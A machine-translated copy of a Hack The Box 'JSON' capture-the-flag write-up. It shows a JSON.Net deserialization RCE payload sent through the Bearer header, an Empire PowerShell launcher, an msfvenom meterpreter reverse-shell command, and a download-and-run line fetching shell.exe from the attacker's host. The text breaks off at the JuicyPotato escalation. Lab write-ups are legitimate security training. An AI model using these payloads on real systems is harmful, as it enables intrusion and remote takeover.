<html>
<head>
<title>[HTB] JSON — Write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[HTB]JSON-报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-json-write-up-6f91f89bcbf1?source=collection_archive---------1-----------------------#2020-02-17">https://infosecwriteups.com/htb-json-write-up-6f91f89bcbf1?source=collection_archive---------1-----------------------#2020-02-17</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/8e2028f947f52697e7b11846cbba64bd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*odxH7XGwei-MHPgtY9cF8g.png"/></div></div></figure><p id="e6b1" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">欢迎来到JSON box专栏！这是一个中等难度的盒子，玩起来很有趣。对于最初的shell，您需要识别与网站上基于JSON的反序列化相关的漏洞，通过利用这个与<code class="fe kz la lb lc b">Bearer:</code>头合并的问题，您可以获得一个RCE。对于根shell，您可以利用为初始用户<code class="fe kz la lb lc b">SeImpersonatePrivilege</code>配置的许可权限来执行JuicyPotato攻击，以获得系统shell。让我们开始吧。</p></div><div class="ab cl ld le hx lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="im in io ip iq"><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi lk"><img src="../Images/b7a63f431ab357d860ae37c609ce947f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1180/format:webp/1*nlGWuQVBCup8Jed0k1_jmA.png"/></div></figure><h1 id="eea7" class="lp lq it bd lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm bi translated">侦察</h1><h2 id="120d" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated">Nmap</h2><p id="a476" class="pw-post-body-paragraph kb kc it kd b ke mz kg kh ki na kk kl km nb ko kp kq nc ks kt ku nd kw kx ky im bi translated">像往常一样，让我们从基本的Nmap发现扫描开始:</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="04b4" class="mn lq it lc b gy ni nj l nk nl">nmap -Pn --open -sC -sV -p- -T4 10.10.10.158</span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/18e8a26b3a8f996ad25403ac35f77907.png" data-original-src="https://miro.medium.com/v2/resize:fit:1276/format:webp/1*Lg4c42yLwJ51asHKv8dvEA.png"/></div></figure><p id="0126" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">通过扫描，我们发现了一些有趣的端口:</p><ul class=""><li id="16d6" class="nn no it kd b ke kf ki kj km np kq nq ku nr ky ns nt nu nv bi translated"><strong class="kd iu">FTP(21/TCP)</strong>—<em class="nw">*不允许匿名登录</em></li><li id="92de" class="nn no it kd b ke nx ki ny km nz kq oa ku ob ky ns nt nu nv bi translated"><strong class="kd iu"> HTTP (80/TCP) </strong></li><li id="26bb" class="nn no it kd b ke nx ki ny km nz kq oa ku ob ky ns nt nu nv bi translated"><strong class="kd iu">SMB(445/TCP)</strong>—<em class="nw">*不允许空会话</em></li><li id="4426" class="nn no it kd b ke nx ki ny km nz kq oa ku ob ky ns nt nu nv bi translated"><strong class="kd iu">WinRM(5985/TCP)</strong>—<em class="nw">* Windows远程管理(WinRM)的默认端口。如果我们有一个属于“远程管理用户”组的用户及其凭证，我们就可以获得一个利用该服务的远程shell。然而，这并不需要在这个盒子上获得一个初始外壳。</em></li></ul><h2 id="0b26" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated">Web服务器(HTTP — 80/TCP)</h2><p id="6025" class="pw-post-body-paragraph kb kc it kd b ke mz kg kh ki na kk kl km nb ko kp kq nc ks kt ku nd kw kx ky im bi translated">所以从最初的扫描来看，看起来我们需要首先关注web服务器。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oc"><img src="../Images/c7b2142f64af945a813cfc0fa256b750.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MVXymjsH-_eBbxzgh__LLw.png"/></div></div></figure><p id="4aac" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">首页是一个登录页面，它是用弱凭据配置的:</p><p id="5019" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><code class="fe kz la lb lc b">Username = admin : Password = admin</code></p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi od"><img src="../Images/e961a61cb9f583bcf3ac34d2e4d0b7fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7_FR_p45IqnEaQ9kQKH2Fw.png"/></div></div></figure><p id="6941" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">一旦作为“管理员”用户登录，网站本身就陷入了死胡同。页面和功能要么是静态的，要么是404未找到。</p><h2 id="180c" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated">网络服务器—目录搜索</h2><p id="76f4" class="pw-post-body-paragraph kb kc it kd b ke mz kg kh ki na kk kl km nb ko kp kq nc ks kt ku nd kw kx ky im bi translated">当您的目标是web服务器时，建议进行目录强制，以检查是否有任何隐藏的文件/文件夹。我使用了<a class="ae oe" href="https://github.com/maurosoria/dirsearch" rel="noopener ugc nofollow" target="_blank"> Dirsearch </a>工具来完成这个任务。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi of"><img src="../Images/82d28ae2c757261e6d5a6ff7aeafd79f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Fpq4nXvik89ao8ui4VP1zA.png"/></div></div></figure><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi og"><img src="../Images/9e52251c682dfab7b7dde9dd36f4c215.png" data-original-src="https://miro.medium.com/v2/resize:fit:1028/format:webp/1*7URSyfGmllv34oDxoopZ-w.png"/></div><figcaption class="oh oi gj gh gi oj ok bd b be z dk translated">/file/password . txt</figcaption></figure><p id="c4ee" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在<code class="fe kz la lb lc b">/files</code>文件夹下有一个<code class="fe kz la lb lc b">password.txt</code>文件，但它是一个巨魔。-_-</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ol"><img src="../Images/8b683da37a1760e0c26e92307d7b6d94.png" data-original-src="https://miro.medium.com/v2/resize:fit:716/format:webp/1*Gz1JDxU5t56AtwWzT69sOA.png"/></div></div></figure><p id="ab83" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">不过在<code class="fe kz la lb lc b">/api</code>目录下发现了一个有趣的文件<code class="fe kz la lb lc b">Account</code>。</p><h2 id="3dc4" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated">Web服务器—登录(JSON Web令牌)</h2><p id="67ec" class="pw-post-body-paragraph kb kc it kd b ke mz kg kh ki na kk kl km nb ko kp kq nc ks kt ku nd kw kx ky im bi translated">现在，让我们把重点放在登录功能上。您可以使用Burp代理来捕获登录，以检查正在发生的事情。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi om"><img src="../Images/389a5ae069bc2a54082744083d077786.png" data-original-src="https://miro.medium.com/v2/resize:fit:1258/format:webp/1*zWRHHEUlRA6l5rrAp3F4AA.png"/></div></figure><p id="f681" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">如您所见，它对web服务器进行基于JSON的认证。让我们根据这个<code class="fe kz la lb lc b">POST</code>请求来检查web响应。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi on"><img src="../Images/e0075a43847f8b715319bd57459b5ec4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1272/format:webp/1*A8KkjEUmmK0LsHypnkk_8w.png"/></div></figure><p id="efff" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">因此，一旦我们通过了身份验证，它就会为我们提供<code class="fe kz la lb lc b">OAuth2</code>访问令牌，以JWT (JSON Web Token)格式授予进一步的访问权限。仅供参考:</p><blockquote class="oo op oq"><p id="81a8" class="kb kc nw kd b ke kf kg kh ki kj kk kl or kn ko kp os kr ks kt ot kv kw kx ky im bi translated">OAuth2是一种协议，它允许用户向另一个站点授予对他们在一个站点上的资源的有限访问权，而不必暴露他们的凭证。</p><p id="19f1" class="kb kc nw kd b ke kf kg kh ki kj kk kl or kn ko kp os kr ks kt ot kv kw kx ky im bi translated"><strong class="kd iu"> JWT </strong>可以用作OAuth2 <a class="ae oe" href="https://oauth.net/2/bearer-tokens/" rel="noopener ugc nofollow" target="_blank">承载令牌</a>以将接入令牌的所有相关部分编码到接入令牌本身中，而不是必须将它们存储在数据库中。</p></blockquote><p id="55eb" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们也可以通过base64解码<code class="fe kz la lb lc b">OAuth2</code>令牌值来确认这一点。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="24d8" class="mn lq it lc b gy ni nj l nk nl">echo -n "eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=" | base64 -d</span><span id="7b1b" class="mn lq it lc b gy ou nj l nk nl">{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}</span></pre><p id="7022" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">此外，您还可以看到，使用之前找到的<code class="fe kz la lb lc b">/api/Account</code>文件，经过身份验证的会话实际上在其cookie头中包含了JWT令牌。</p><ul class=""><li id="dca8" class="nn no it kd b ke kf ki kj km np kq nq ku nr ky ns nt nu nv bi translated">以管理员用户身份登录之前:</li></ul><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi om"><img src="../Images/c18e8534a92cff0c9a1a0f47e4417762.png" data-original-src="https://miro.medium.com/v2/resize:fit:1258/format:webp/1*2p4oRsYRyY6tHjc7n2EdTQ.png"/></div></figure><ul class=""><li id="2f94" class="nn no it kd b ke kf ki kj km np kq nq ku nr ky ns nt nu nv bi translated">以管理员用户身份登录后:</li></ul><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/e6505698c9112354f1588ef708a5f90e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1266/format:webp/1*QKr7tm3gKsAgQEsyIht7jA.png"/></div></figure></div><div class="ab cl ld le hx lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="im in io ip iq"><h1 id="ecf2" class="lp lq it bd lr ls ow lu lv lw ox ly lz ma oy mc md me oz mg mh mi pa mk ml mm bi translated">初始外壳</h1><h2 id="26e5" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated">JSON反序列化攻击</h2><p id="db8b" class="pw-post-body-paragraph kb kc it kd b ke mz kg kh ki na kk kl km nb ko kp kq nc ks kt ku nd kw kx ky im bi translated">由于当前用户的JWT可以从<code class="fe kz la lb lc b">/api/Account</code> API请求中检索，我们可以通过使用<code class="fe kz la lb lc b">Bearer:</code>头来检查这个请求是否容易受到反序列化的攻击。</p><p id="2748" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><strong class="kd iu"> 1。添加一个纯</strong> <code class="fe kz la lb lc b"><strong class="kd iu">Bearer:</strong></code> <strong class="kd iu">表头:</strong></p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pb"><img src="../Images/cdce2aa2aaff0af295be2c4f099f50d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tse0Lcz-xqo98rXKKCCKUw.png"/></div></div></figure><p id="e024" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当我们添加一个没有值的<code class="fe kz la lb lc b">Bearer:</code>头时，我们得到一个<code class="fe kz la lb lc b">null</code>响应。</p><p id="ba58" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><strong class="kd iu"> 2。将当前</strong> <code class="fe kz la lb lc b"><strong class="kd iu">OAuth2</strong></code> <strong class="kd iu">值添加到</strong> <code class="fe kz la lb lc b"><strong class="kd iu">Bearer:</strong></code> <strong class="kd iu">表头:</strong></p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pc"><img src="../Images/08c66b04cb285721ac64def81fb79a49.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ny-xjlWanSG0PdTqHDd9aA.png"/></div></div></figure><p id="2661" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当我们添加一个带有当前base64编码的<code class="fe kz la lb lc b">OAuth2</code>值的<code class="fe kz la lb lc b">Bearer:</code>头时，我们得到一个解码的cookie值。</p><p id="6236" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><strong class="kd iu"> 3。将随机值添加到</strong> <code class="fe kz la lb lc b"><strong class="kd iu">Bearer:</strong></code> <strong class="kd iu">标题:</strong></p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pc"><img src="../Images/a1e4b61c99791193fca2340fa2d89170.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cd71IXK4A7XgNq1Pb7KfKg.png"/></div></div></figure><p id="ac0c" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">当我们这次添加一个随机值(“bigb0ss”)时，我们得到一个JSON.Net反序列化错误。这很有意思。进一步的调查发现，我们可以得到一个滥用这个反序列化问题的RCE。我能够从GitHub的<a class="ae oe" href="https://github.com/pwntester/ysoserial.net" rel="noopener ugc nofollow" target="_blank"> Yosoerial </a>工具中找到一个非常酷的PoC有效载荷。我简单地复制并粘贴了JSON.net有效载荷，修改了命令的<code class="fe kz la lb lc b">$value:</code>部分，并手动对有效载荷进行了base64编码以执行攻击。</p><h2 id="4474" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated">JSON反序列化攻击— RCE</h2><p id="5db4" class="pw-post-body-paragraph kb kc it kd b ke mz kg kh ki na kk kl km nb ko kp kq nc ks kt ku nd kw kx ky im bi translated">这是更盲目的RCE，所以我们可以做一个快速的<code class="fe kz la lb lc b">ping</code>命令，看看我们是否有一个成功的RCE。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="858a" class="mn lq it lc b gy ni nj l nk nl"><strong class="lc iu">### Creating a payload.txt file </strong><br/>cat payload.txt</span><span id="f900" class="mn lq it lc b gy ou nj l nk nl">{<br/>    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',<br/>    'MethodName':'Start',<br/>    'MethodParameters':{<br/>        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',<br/>        '$values':<strong class="lc iu">['cmd','  /c ping 10.10.14.29']</strong><br/>    },<br/>    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}<br/>}<br/></span><span id="281d" class="mn lq it lc b gy ou nj l nk nl"><strong class="lc iu">### Base64-encoded payload.txt</strong><br/>cat payload.txt | base64</span><span id="1aed" class="mn lq it lc b gy ou nj l nk nl">ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUnLAogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsCiAgICAnTWV0aG9kUGFyYW1ldGVycyc6ewogICAgICAgICckdHlwZSc6J1N5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OScsCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnICAvYyBwaW5nIDEwLjEwLjE0LjI5J10KICAgIH0sCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9Cn0K<br/></span><span id="b3af" class="mn lq it lc b gy ou nj l nk nl"><strong class="lc iu">### Running payload with Curl</strong><br/>curl -X GET '<a class="ae oe" href="http://10.10.10.158/api/Account'" rel="noopener ugc nofollow" target="_blank">http://10.10.10.158/api/Account'</a> -H 'Bearer: ewogICAgJyR0eXBlJzonU3lzdGVtLldpbmRvd3MuRGF0YS5PYmplY3REYXRhUHJvdmlkZXIsIFByZXNlbnRhdGlvbkZyYW1ld29yaywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUnLAogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsCiAgICAnTWV0aG9kUGFyYW1ldGVycyc6ewogICAgICAgICckdHlwZSc6J1N5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OScsCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnICAvYyBwaW5nIDEwLjEwLjE0LjI5J10KICAgIH0sCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9Cn0K'</span></pre><p id="be75" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">一旦我们运行上面的<code class="fe kz la lb lc b">curl</code>命令，我们将看到来自JSON box的ICMP回应请求。我们有一个成功的RCE在盒子上。:)</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pd"><img src="../Images/9724f08767b2127ae66489d0f161542d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CvzW95qBgBm3FsHgcGZ5WA.png"/></div></div></figure><h2 id="a2c0" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated">JSON反序列化攻击—反向外壳</h2><p id="4dcb" class="pw-post-body-paragraph kb kc it kd b ke mz kg kh ki na kk kl km nb ko kp kq nc ks kt ku nd kw kx ky im bi translated">对于反壳，有多种获取方式。我使用Empire <code class="fe kz la lb lc b">launch.bat</code> payload来获得一个初始代码执行，并上传<code class="fe kz la lb lc b">msfvenom</code>来创建一个<code class="fe kz la lb lc b">exe</code>文件以获得一个交互式的<code class="fe kz la lb lc b">meterpreter</code> shell。</p><h2 id="31cf" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated"><strong class="ak">帝国</strong></h2><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="7e9e" class="mn lq it lc b gy ni nj l nk nl"><strong class="lc iu">### Listener Configuration</strong><br/>uselistener http<br/>set Host <a class="ae oe" href="http://10.10.14.29" rel="noopener ugc nofollow" target="_blank">http://&lt;Attacker IP&gt;</a><br/>execute<br/>listeners</span><span id="7e0c" class="mn lq it lc b gy ou nj l nk nl"><strong class="lc iu">### Creating Payload</strong><br/>usestager windows/launcher.bat<br/>set Listener http<br/>generate</span></pre><p id="6c93" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">一旦创建了<code class="fe kz la lb lc b">launch.bat</code>有效载荷，就将一行程序的<code class="fe kz la lb lc b">powershell</code>部分复制到我们的反序列化有效载荷中。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="376d" class="mn lq it lc b gy ni nj l nk nl"><strong class="lc iu">### Empire payload.txt</strong><br/>cat payload_EMPIRE.txt</span><span id="8136" class="mn lq it lc b gy ou nj l nk nl">{<br/>    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',<br/>    'MethodName':'Start',<br/>    'MethodParameters':{<br/>        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',<br/>        '$values':[<strong class="lc iu">'powershell','powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAFIAcwBJ<br/><em class="nw">...SNIP...<br/></em>aABBAFIAWwBdAF0AKAAmACAAJABSACAAJABkAEEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA='</strong>]<br/>    },<br/>    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}<br/>}</span><span id="ef56" class="mn lq it lc b gy ou nj l nk nl">JaABBAFIAWwBdAF0AKAAmACAAJABSACAAJABkAEEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=']<br/>    },<br/>    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}<br/>}</span></pre><p id="38a9" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">同样，对<code class="fe kz la lb lc b">payload_EMPIRE.txt</code>进行base64编码，然后用<code class="fe kz la lb lc b">curl</code>命令运行它，得到一个帝国代理。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="9b96" class="mn lq it lc b gy ni nj l nk nl"><strong class="lc iu">### Running payload with Curl</strong><br/>curl -X GET '<a class="ae oe" href="http://10.10.10.158/api/Account'" rel="noopener ugc nofollow" target="_blank">http://10.10.10.158/api/Account'</a> -H 'Bearer:&lt;Base64-encoded payload_EMPIRE.txt&gt;</span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pe"><img src="../Images/7b2b3c67d4255ac591dfeecf79e30fd2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ANn2ViIeW7GnYeXrCgPAJg.png"/></div></div></figure><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pf"><img src="../Images/6fce87dae4db83318db448dbfa1eee7e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3M1ocJG6r3yub2u1z1np4Q.png"/></div></div></figure><h2 id="dad3" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated">user.txt</h2><p id="d04a" class="pw-post-body-paragraph kb kc it kd b ke mz kg kh ki na kk kl km nb ko kp kq nc ks kt ku nd kw kx ky im bi translated">web服务器运行在<code class="fe kz la lb lc b">userpool</code>用户的上下文中，我们有特权读取<code class="fe kz la lb lc b">user.txt</code>文件。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/964066452711382139766b04eb85a809.png" data-original-src="https://miro.medium.com/v2/resize:fit:1078/format:webp/1*hChgC9bkZc7NM4rDJgNWgQ.png"/></div></figure><h2 id="5257" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated">水表读数器</h2><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="6576" class="mn lq it lc b gy ni nj l nk nl"><strong class="lc iu">### Msfvenom Payload</strong><br/>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=443 -f exe &gt; shell.exe</span></pre><p id="d6f4" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">然后，我们可以通过当前的Empire shell将创建的<code class="fe kz la lb lc b">shell.exe</code>上传到JSON box上。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="8195" class="mn lq it lc b gy ni nj l nk nl"><strong class="lc iu">### Empire Uploading Payload</strong><br/>shell powershell.exe iwr -Uri <a class="ae oe" href="http://10.10.14.29:8000/shell.exe" rel="noopener ugc nofollow" target="_blank">http://10.10.14.29:8000/shell.exe</a> -outfile shell.exe</span><span id="920e" class="mn lq it lc b gy ou nj l nk nl"><strong class="lc iu">### Empire Executing Payload</strong><br/>shell cmd /c shell.exe</span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pf"><img src="../Images/1cb561e0e9013b94e01a9f457bcf6c87.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QpuiZlK2B0Hpf9ymJpsqGg.png"/></div></div></figure><h1 id="4819" class="lp lq it bd lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm bi translated">特许升级</h1><h2 id="bf66" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated">JuicyPotato(SeImpersonatePrivilege—已启用)</h2><p id="30dd" class="pw-post-body-paragraph kb kc it kd b ke mz kg kh ki na kk kl km nb ko kp kq nc ks kt ku nd kw kx ky im bi translated">我们需要做的第一件事是找出当前用户的特权种类<code class="fe kz la lb lc b">userpool</code>。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="cbaf" class="mn lq it lc b gy ni nj l nk nl">c:\Users\userpool&gt;whoami /priv</span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi ph"><img src="../Images/f0f36e62d244b6db2ebd0a4e84d8dbcf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1246/format:webp/1*CL_LNNghnp2jMOhfGNInXw.png"/></div></div></figure><p id="dfce" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我们可以看到我们已经启用了<code class="fe kz la lb lc b">SeImpersonatePrivilege</code>，我们可以进行<code class="fe kz la lb lc b">JuicyPotato</code>攻击来获取系统外壳以提升我们的权限。此外，这个机器是一个有点旧的Windows 2012 R2服务器，所以它可能是一个正确的路径来执行此攻击。</p><p id="cd9d" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我发现一个很好的自动化<code class="fe kz la lb lc b">JuicyPotato</code>攻击<a class="ae oe" href="https://github.com/TsukiCTF/Lovely-Potato" rel="noopener ugc nofollow" target="_blank"> PowerShell脚本</a>由TsukiCTF团队创建，名为<code class="fe kz la lb lc 